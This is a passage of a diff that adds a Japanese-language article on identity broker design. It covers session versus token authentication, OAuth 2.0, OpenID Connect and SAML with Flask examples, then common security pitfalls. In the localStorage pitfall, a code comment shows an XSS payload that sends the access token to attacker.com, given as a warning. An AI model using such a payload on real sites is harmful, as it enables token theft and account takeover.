+    session <span class="token operator">=</span> broker<span class="token punctuation">.</span>validate_session<span class="token punctuation">(</span>session_id<span class="token punctuation">)</span>
+    
+    <span class="token keyword">if</span> session<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"ようこそ </span><span class="token interpolation"><span class="token punctuation">{</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>
+    <span class="token keyword">return</span> <span class="token string">"未認証"</span><span class="token punctuation">,</span> <span class="token number">401</span></code></pre>
+<div class="admonition success"><p class="admonition-title"><span class="mdi mdi-check-circle-outline admonition-icon"></span>✅ セッションベースの利点</p><div class="admonition-content"><p><strong>即座の失効</strong></p>
+<ul>
+<li>セッションがサーバー側に保存</li>
+<li>ログアウトが即座にセッションを無効化</li>
+<li>侵害されたセッションを即座に失効可能</li>
+<li>きめ細かいセッション制御</li>
+</ul>
+<p><strong>小さいクライアントストレージ</strong></p>
+<ul>
+<li>セッションIDのみがクライアントに送信</li>
+<li>最小限の帯域幅オーバーヘッド</li>
+<li>ユーザーデータがサーバー側に保存</li>
+<li>XSS露出の削減</li>
+</ul>
+<p><strong>柔軟なセッション管理</strong></p>
+<ul>
+<li>クライアント変更なしでセッションデータを更新</li>
+<li>セッションアクティビティと場所を追跡</li>
+<li>同時セッション制限を実装</li>
+<li>豊富なセッションメタデータ</li>
+</ul>
+</div></div>
+<p>セッションベース認証にもトレードオフがあります：</p>
+<div class="admonition warning"><p class="admonition-title"><span class="mdi mdi-alert-outline admonition-icon"></span>⚠️ セッションベースの課題</p><div class="admonition-content"><p><strong>スケーラビリティの複雑さ</strong></p>
+<ul>
+<li>共有セッションストアが必要（Redis、データベース）</li>
+<li>サーバー間でのセッション複製</li>
+<li>ロードバランサーのセッションアフィニティまたはスティッキーセッション</li>
+<li>水平スケーリングがより複雑</li>
+</ul>
+<p><strong>パフォーマンスオーバーヘッド</strong></p>
+<ul>
+<li>各リクエストでデータベース検索</li>
+<li>セッションストアへのネットワークレイテンシ</li>
+<li>アイデンティティブローカーへの負荷が高い</li>
+<li>スケール時の潜在的なボトルネック</li>
+</ul>
+<p><strong>分散システムの課題</strong></p>
+<ul>
+<li>マイクロサービスは検証のためにブローカーを呼び出す必要</li>
+<li>各リクエストのネットワーク依存</li>
+<li>サービスチェーンでのレイテンシ増加</li>
+<li>ブローカーが重要な依存関係になる</li>
+</ul>
+</div></div>
+<h3 id="ハイブリッドアプローチ：短期トークンとリフレッシュトークン">ハイブリッドアプローチ：短期トークンとリフレッシュトークン</h3>
+<p>多くの最新システムは、両方の利点を組み合わせたハイブリッドアプローチを使用します：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># アクセストークンとリフレッシュトークンを使用したハイブリッド認証</span>
+<span class="token keyword">class</span> <span class="token class-name">HybridAuthBroker</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> secret_key<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secret_key
+        self<span class="token punctuation">.</span>refresh_tokens <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment"># サーバー側リフレッシュトークンストア</span>
+    
+    <span class="token keyword">def</span> <span class="token function">authenticate</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> self<span class="token punctuation">.</span>verify_credentials<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token comment"># 短期アクセストークン（15分）</span>
+            access_token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">{</span>
+                <span class="token string">'sub'</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>
+                <span class="token string">'exp'</span><span class="token punctuation">:</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>minutes<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token string">'type'</span><span class="token punctuation">:</span> <span class="token string">'access'</span>
+            <span class="token punctuation">}</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>secret_key<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span>
+            
+            <span class="token comment"># 長期リフレッシュトークン（7日）サーバー側に保存</span>
+            refresh_token <span class="token operator">=</span> secrets<span class="token punctuation">.</span>token_urlsafe<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
+            self<span class="token punctuation">.</span>refresh_tokens<span class="token punctuation">[</span>refresh_token<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
+                <span class="token string">'username'</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>
+                <span class="token string">'expires'</span><span class="token punctuation">:</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>days<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">)</span>
+            <span class="token punctuation">}</span>
+            
+            <span class="token keyword">return</span> <span class="token punctuation">{</span>
+                <span class="token string">'access_token'</span><span class="token punctuation">:</span> access_token<span class="token punctuation">,</span>
+                <span class="token string">'refresh_token'</span><span class="token punctuation">:</span> refresh_token<span class="token punctuation">,</span>
+                <span class="token string">'expires_in'</span><span class="token punctuation">:</span> <span class="token number">900</span>  <span class="token comment"># 15分</span>
+            <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> <span class="token boolean">None</span>
+    
+    <span class="token keyword">def</span> <span class="token function">refresh_access_token</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> refresh_token<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># リフレッシュトークンを検証（サーバー側チェック）</span>
+        token_data <span class="token operator">=</span> self<span class="token punctuation">.</span>refresh_tokens<span class="token punctuation">.</span>get<span class="token punctuation">(</span>refresh_token<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> token_data <span class="token keyword">and</span> token_data<span class="token punctuation">[</span><span class="token string">'expires'</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token comment"># 新しいアクセストークンを発行</span>
+            access_token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">{</span>
+                <span class="token string">'sub'</span><span class="token punctuation">:</span> token_data<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+                <span class="token string">'exp'</span><span class="token punctuation">:</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>minutes<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token string">'type'</span><span class="token punctuation">:</span> <span class="token string">'access'</span>
+            <span class="token punctuation">}</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>secret_key<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> access_token
+        <span class="token keyword">return</span> <span class="token boolean">None</span>
+    
+    <span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> refresh_token<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># リフレッシュトークンを失効</span>
+        <span class="token keyword">if</span> refresh_token <span class="token keyword">in</span> self<span class="token punctuation">.</span>refresh_tokens<span class="token punctuation">:</span>
+            <span class="token keyword">del</span> self<span class="token punctuation">.</span>refresh_tokens<span class="token punctuation">[</span>refresh_token<span class="token punctuation">]</span></code></pre>
+<div class="admonition tip"><p class="admonition-title"><span class="mdi mdi-lightbulb-on-outline admonition-icon"></span>🎯 ハイブリッドアプローチの利点</p><div class="admonition-content"><p><strong>バランスの取れたセキュリティ</strong></p>
+<ul>
+<li>短期アクセストークンが露出ウィンドウを制限</li>
+<li>侵害されたアクセストークンはすぐに期限切れ</li>
+<li>リフレッシュトークンは即座に失効可能</li>
+<li>ログアウトがリフレッシュトークンを無効化</li>
+</ul>
+<p><strong>パフォーマンスとスケーラビリティ</strong></p>
+<ul>
+<li>アクセストークンはローカルで検証（ステートレス）</li>
+<li>リフレッシュトークンチェックは頻繁でない（15分ごと）</li>
+<li>アイデンティティブローカーへの負荷が削減</li>
+<li>トークンベース認証のようにスケーラブル</li>
+</ul>
+<p><strong>ユーザーエクスペリエンス</strong></p>
+<ul>
+<li>バックグラウンドでシームレスなトークン更新</li>
+<li>頻繁な再認証が不要</li>
+<li>ログアウトが即座に機能</li>
+<li>セキュリティと利便性のバランス</li>
+</ul>
+</div></div>
+<p>このハイブリッドアプローチは OAuth 2.0 と OpenID Connect で使用され、業界のベストプラクティスを表しています。</p>
+<h2 id="プロトコルの選択：OAuth-2-0、SAML、OpenID-Connect">プロトコルの選択：OAuth 2.0、SAML、OpenID Connect</h2>
+<p>アイデンティティブローカーは、さまざまな認証プロトコルをサポートする必要があります。それらの違いを理解することは、実装の決定に不可欠です。</p>
+<h3 id="OAuth-2-0：認可フレームワーク">OAuth 2.0：認可フレームワーク</h3>
+<p>OAuth 2.0 は認可フレームワークであり、認証プロトコルではありませんが、両方に使用されることがよくあります：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># OAuth 2.0 認可コードフロー</span>
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect
+<span class="token keyword">import</span> requests
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+BROKER_AUTH_URL <span class="token operator">=</span> <span class="token string">'https://broker.example.com/oauth/authorize'</span>
+BROKER_TOKEN_URL <span class="token operator">=</span> <span class="token string">'https://broker.example.com/oauth/token'</span>
+CLIENT_ID <span class="token operator">=</span> <span class="token string">'your_client_id'</span>
+CLIENT_SECRET <span class="token operator">=</span> <span class="token string">'your_client_secret'</span>
+REDIRECT_URI <span class="token operator">=</span> <span class="token string">'https://app.example.com/callback'</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># ユーザーをアイデンティティブローカーにリダイレクト</span>
+    auth_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>BROKER_AUTH_URL<span class="token punctuation">}</span></span><span class="token string">?client_id=</span><span class="token interpolation"><span class="token punctuation">{</span>CLIENT_ID<span class="token punctuation">}</span></span><span class="token string">&amp;redirect_uri=</span><span class="token interpolation"><span class="token punctuation">{</span>REDIRECT_URI<span class="token punctuation">}</span></span><span class="token string">&amp;response_type=code&amp;scope=openid profile email"</span></span>
+    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>auth_url<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/callback'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># ブローカーが認可コードでリダイレクトバック</span>
+    code <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">)</span>
+    
+    <span class="token comment"># コードをアクセストークンと交換</span>
+    token_response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>BROKER_TOKEN_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span>
+        <span class="token string">'grant_type'</span><span class="token punctuation">:</span> <span class="token string">'authorization_code'</span><span class="token punctuation">,</span>
+        <span class="token string">'code'</span><span class="token punctuation">:</span> code<span class="token punctuation">,</span>
+        <span class="token string">'redirect_uri'</span><span class="token punctuation">:</span> REDIRECT_URI<span class="token punctuation">,</span>
+        <span class="token string">'client_id'</span><span class="token punctuation">:</span> CLIENT_ID<span class="token punctuation">,</span>
+        <span class="token string">'client_secret'</span><span class="token punctuation">:</span> CLIENT_SECRET
+    <span class="token punctuation">}</span><span class="token punctuation">)</span>
+    
+    tokens <span class="token operator">=</span> token_response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    access_token <span class="token operator">=</span> tokens<span class="token punctuation">[</span><span class="token string">'access_token'</span><span class="token punctuation">]</span>
+    
+    <span class="token comment"># アクセストークンを使用してユーザー情報を取得</span>
+    user_response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>
+        <span class="token string">'https://broker.example.com/userinfo'</span><span class="token punctuation">,</span>
+        headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'Authorization'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'Bearer </span><span class="token interpolation"><span class="token punctuation">{</span>access_token<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">}</span>
+    <span class="token punctuation">)</span>
+    
+    user_info <span class="token operator">=</span> user_response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token comment"># user_info でアプリケーションセッションを作成</span>
+    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"ようこそ </span><span class="token interpolation"><span class="token punctuation">{</span>user_info<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">"</span></span></code></pre>
+<div class="admonition anote"><p class="admonition-title"><span class="mdi mdi-note-outline admonition-icon"></span>📋 OAuth 2.0 の特徴</p><div class="admonition-content"><p><strong>設計目的</strong></p>
+<ul>
+<li>委任認可</li>
+<li>サードパーティAPIアクセス</li>
+<li>モバイルおよびWebアプリケーション</li>
+<li>最新のREST API</li>
+</ul>
+<p><strong>利点</strong></p>
+<ul>
+<li>シンプルなHTTPベースのプロトコル</li>
+<li>広範な業界採用</li>
+<li>モバイルフレンドリー</li>
+<li>柔軟なグラントタイプ</li>
+</ul>
+<p><strong>制限事項</strong></p>
+<ul>
+<li>認証用に設計されていない</li>
+<li>標準的なユーザー情報フォーマットがない</li>
+<li>追加のプロファイルエンドポイントが必要</li>
+<li>トークンフォーマットが標準化されていない</li>
+</ul>
+</div></div>
+<h3 id="OpenID-Connect：OAuth-2-0-上の認証レイヤー">OpenID Connect：OAuth 2.0 上の認証レイヤー</h3>
+<p>OpenID Connect（OIDC）は、認証のために OAuth 2.0 を特別に拡張します：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># OpenID Connect は OAuth 2.0 フローに ID トークンを追加</span>
+<span class="token keyword">from</span> jose <span class="token keyword">import</span> jwt
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/oidc-callback'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">oidc_callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    code <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">)</span>
+    
+    <span class="token comment"># コードをトークンと交換</span>
+    token_response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>BROKER_TOKEN_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span>
+        <span class="token string">'grant_type'</span><span class="token punctuation">:</span> <span class="token string">'authorization_code'</span><span class="token punctuation">,</span>
+        <span class="token string">'code'</span><span class="token punctuation">:</span> code<span class="token punctuation">,</span>
+        <span class="token string">'redirect_uri'</span><span class="token punctuation">:</span> REDIRECT_URI<span class="token punctuation">,</span>
+        <span class="token string">'client_id'</span><span class="token punctuation">:</span> CLIENT_ID<span class="token punctuation">,</span>
+        <span class="token string">'client_secret'</span><span class="token punctuation">:</span> CLIENT_SECRET
+    <span class="token punctuation">}</span><span class="token punctuation">)</span>
+    
+    tokens <span class="token operator">=</span> token_response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    id_token <span class="token operator">=</span> tokens<span class="token punctuation">[</span><span class="token string">'id_token'</span><span class="token punctuation">]</span>  <span class="token comment"># OIDC が ID トークンを追加</span>
+    access_token <span class="token operator">=</span> tokens<span class="token punctuation">[</span><span class="token string">'access_token'</span><span class="token punctuation">]</span>
+    
+    <span class="token comment"># ID トークンを検証してデコード</span>
+    <span class="token comment"># ID トークンにはユーザーアイデンティティクレームが含まれる</span>
+    user_claims <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>
+        id_token<span class="token punctuation">,</span>
+        key<span class="token operator">=</span>get_broker_public_key<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        algorithms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'RS256'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        audience<span class="token operator">=</span>CLIENT_ID
+    <span class="token punctuation">)</span>
+    
+    <span class="token comment"># ID トークンには：sub、name、email などが含まれる</span>
+    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"ようこそ </span><span class="token interpolation"><span class="token punctuation">{</span>user_claims<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string"> (</span><span class="token interpolation"><span class="token punctuation">{</span>user_claims<span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">)"</span></span></code></pre>
+<div class="admonition success"><p class="admonition-title"><span class="mdi mdi-check-circle-outline admonition-icon"></span>✅ OpenID Connect の利点</p><div class="admonition-content"><p><strong>認証専用に構築</strong></p>
+<ul>
+<li>ID トークンにユーザーアイデンティティが含まれる</li>
+<li>標準化されたユーザークレーム</li>
+<li>追加のプロファイルエンドポイントが不要</li>
+<li>明確な認証セマンティクス</li>
+</ul>
+<p><strong>セキュリティ機能</strong></p>
+<ul>
+<li>ID トークンは署名された JWT</li>
+<li>暗号検証</li>
+<li>オーディエンスと発行者の検証</li>
+<li>リプレイ保護のための nonce</li>
+</ul>
+<p><strong>業界標準</strong></p>
+<ul>
+<li>すべての主要なアイデンティティプロバイダーがサポート</li>
+<li>広範なライブラリサポート</li>
+<li>よく文書化された仕様</li>
+<li>活発な開発と更新</li>
+</ul>
+</div></div>
+<h3 id="SAML-2-0：エンタープライズ標準">SAML 2.0：エンタープライズ標準</h3>
+<p>SAML（Security Assertion Markup Language）は、従来のエンタープライズ認証プロトコルです：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># SAML 2.0 認証フロー（簡略化）</span>
+<span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree
+<span class="token keyword">from</span> signxml <span class="token keyword">import</span> XMLVerifier
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/saml/login'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">saml_login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># SAML 認証リクエストを生成</span>
+    saml_request <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""
+    &lt;samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
+                        ID="</span><span class="token interpolation"><span class="token punctuation">{</span>generate_request_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"
+                        Version="2.0"
+                        IssueInstant="</span><span class="token interpolation"><span class="token punctuation">{</span>datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isoformat<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">Z"
+                        Destination="</span><span class="token interpolation"><span class="token punctuation">{</span>BROKER_SSO_URL<span class="token punctuation">}</span></span><span class="token string">"&gt;
+        &lt;saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"&gt;
+            </span><span class="token interpolation"><span class="token punctuation">{</span>SERVICE_PROVIDER_ID<span class="token punctuation">}</span></span><span class="token string">
+        &lt;/saml:Issuer&gt;
+    &lt;/samlp:AuthnRequest&gt;
+    """</span></span>
+    
+    <span class="token comment"># エンコードしてアイデンティティブローカーにリダイレクト</span>
+    encoded_request <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>saml_request<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    sso_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>BROKER_SSO_URL<span class="token punctuation">}</span></span><span class="token string">?SAMLRequest=</span><span class="token interpolation"><span class="token punctuation">{</span>encoded_request<span class="token punctuation">}</span></span><span class="token string">"</span></span>
+    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>sso_url<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/saml/acs'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">saml_assertion_consumer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># ブローカーが SAML レスポンスをポストバック</span>
+    saml_response <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'SAMLResponse'</span><span class="token punctuation">]</span>
+    decoded_response <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>saml_response<span class="token punctuation">)</span>
+    
+    <span class="token comment"># SAML アサーション署名を検証</span>
+    xml_doc <span class="token operator">=</span> etree<span class="token punctuation">.</span>fromstring<span class="token punctuation">(</span>decoded_response<span class="token punctuation">)</span>
+    verified_data <span class="token operator">=</span> XMLVerifier<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>verify<span class="token punctuation">(</span>
+        xml_doc<span class="token punctuation">,</span>
+        x509_cert<span class="token operator">=</span>get_broker_certificate<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">)</span><span class="token punctuation">.</span>signed_xml
+    
+    <span class="token comment"># アサーションからユーザー属性を抽出</span>
+    nameid <span class="token operator">=</span> xml_doc<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'.//{urn:oasis:names:tc:SAML:2.0:assertion}NameID'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
+    attributes <span class="token operator">=</span> extract_saml_attributes<span class="token punctuation">(</span>xml_doc<span class="token punctuation">)</span>
+    
+    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"ようこそ </span><span class="token interpolation"><span class="token punctuation">{</span>attributes<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">"</span></span></code></pre>
+<div class="admonition anote"><p class="admonition-title"><span class="mdi mdi-note-outline admonition-icon"></span>🏢 SAML の特徴</p><div class="admonition-content"><p><strong>設計目的</strong></p>
+<ul>
+<li>エンタープライズシングルサインオン</li>
+<li>組織間のフェデレーション</li>
+<li>レガシーエンタープライズシステム</li>
+<li>強力なセキュリティ要件</li>
+</ul>
+<p><strong>利点</strong></p>
+<ul>
+<li>成熟し実戦でテスト済み</li>
+<li>豊富な属性交換</li>
+<li>強力なセキュリティ機能</li>
+<li>エンタープライズでの採用</li>
+</ul>
+<p><strong>欠点</strong></p>
+<ul>
+<li>XMLベース（冗長で複雑）</li>
+<li>モバイルフレンドリーでない</li>
+<li>急な学習曲線</li>
+<li>限られた最新ツール</li>
+</ul>
+</div></div>
+<h3 id="プロトコル選択ガイド">プロトコル選択ガイド</h3>
+<div class="admonition tip"><p class="admonition-title"><span class="mdi mdi-lightbulb-on-outline admonition-icon"></span>🎯 適切なプロトコルの選択</p><div class="admonition-content"><p><strong>OpenID Connect を使用する場合：</strong></p>
+<ul>
+<li>新しいアプリケーションを構築</li>
+<li>モバイルサポートが必要</li>
+<li>最新のREST APIが必要</li>
+<li>シンプルな統合が必要</li>
+<li>コンシューマーユーザーを対象</li>
+</ul>
+<p><strong>SAML を使用する場合：</strong></p>
+<ul>
+<li>エンタープライズシステムとの統合</li>
+<li>企業ITポリシーで要求される</li>
+<li>豊富な属性交換が必要</li>
+<li>他の組織とのフェデレーション</li>
+<li>レガシーシステムの互換性が必要</li>
+</ul>
+<p><strong>OAuth 2.0 を使用する場合：</strong></p>
+<ul>
+<li>API認可が必要（認証ではない）</li>
+<li>サードパーティのリソースアクセス</li>
+<li>委任された権限</li>
+<li>認証には OIDC と組み合わせる</li>
+</ul>
+</div></div>
+<p>Keycloak のような最新のアイデンティティブローカーは、3つのプロトコルすべてをサポートし、アプリケーションがニーズに基づいて選択できるようにします。</p>
+<h2 id="一般的な落とし穴とセキュリティ問題">一般的な落とし穴とセキュリティ問題</h2>
+<p>アイデンティティブローカーの実装は、一般的なセキュリティ脆弱性と設計ミスに悩まされることがよくあります。</p>
+<h3 id="落とし穴-1：ローカルストレージへのトークン保存">落とし穴 1：ローカルストレージへのトークン保存</h3>
+<p>多くのアプリケーションは、ブラウザのローカルストレージにトークンを保存し、XSS脆弱性を生み出します：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// ❌ 安全でない：ローカルストレージにトークンを保存</span>
+<span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token parameter">username<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/api/login'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
+        <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
+        <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span> username<span class="token punctuation">,</span> password <span class="token punctuation">}</span><span class="token punctuation">)</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span>
+    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
+        <span class="token comment">// XSS攻撃に脆弱</span>
+        localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'access_token'</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>access_token<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'refresh_token'</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>refresh_token<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token comment">// あらゆるXSS脆弱性がトークンを盗める</span>
+<span class="token comment">// &lt;script&gt;</span>
+<span class="token comment">//   fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'));</span>
+<span class="token comment">// &lt;/script&gt;</span></code></pre>
+<div class="admonition error"><p class="admonition-title"><span class="mdi mdi-alert-circle-outline admonition-icon"></span>🚫 ローカルストレージの脆弱性</p><div class="admonition-content"><p><strong>XSS攻撃ベクター</strong></p>
+<ul>
+<li>JavaScriptがローカルストレージにアクセス可能</li>
+<li>あらゆるXSS脆弱性がトークンを露出</li>
+<li>サードパーティスクリプトがトークンを盗める</li>
+<li>スクリプトインジェクションに対する保護がない</li>
+</ul>
+<p><strong>影響</strong></p>
+<ul>
+<li>完全なアカウント乗っ取り</li>
+<li>トークンは有効期限まで有効</li>
+<li>攻撃者がユーザーになりすませる</li>
+<li>盗難の検出が困難</li>
+</ul>
+</div></div>
+<p>HTTP-only Cookie を使用するより良いアプローチ：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// ✅ 安全：HTTP-only Cookie を使用</span>
+<span class="token comment">// サーバーが HTTP-only Cookie を設定（JavaScriptはアクセス不可）</span>
